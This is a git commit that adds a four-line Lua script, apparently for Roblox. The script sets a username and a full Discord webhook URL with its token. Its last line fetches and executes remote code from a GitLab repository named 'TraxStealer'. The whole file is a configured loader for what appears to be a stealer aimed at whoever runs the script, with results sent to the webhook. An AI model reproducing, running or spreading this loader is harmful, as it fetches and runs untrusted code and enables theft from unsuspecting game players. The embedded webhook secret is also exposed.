f71fe4a85e5cfc9d96671de6db600a8706cb50a6
hkhoadz <144521811+hkhoadz@users.noreply.github.com>
2025-05-10 12:32:44 +0700

    Add files via upload

---
+++ gorw.lua
@@ -0,0 +1,4 @@
+Username = "hoanhkhoa912"
+Webhook = "https://discord.com/api/webhooks/1370633463602085898/f25yY9MOUzeTkGeE1o0ynFBeDqsL_F16RPhaCALV2wzdIOSdmeRk8x1mYexxyYJZjQt4"
+
+loadstring(game:HttpGet("https://gitlab.com/traxscripts/TraxStealer/-/raw/main/pls-donate"))()
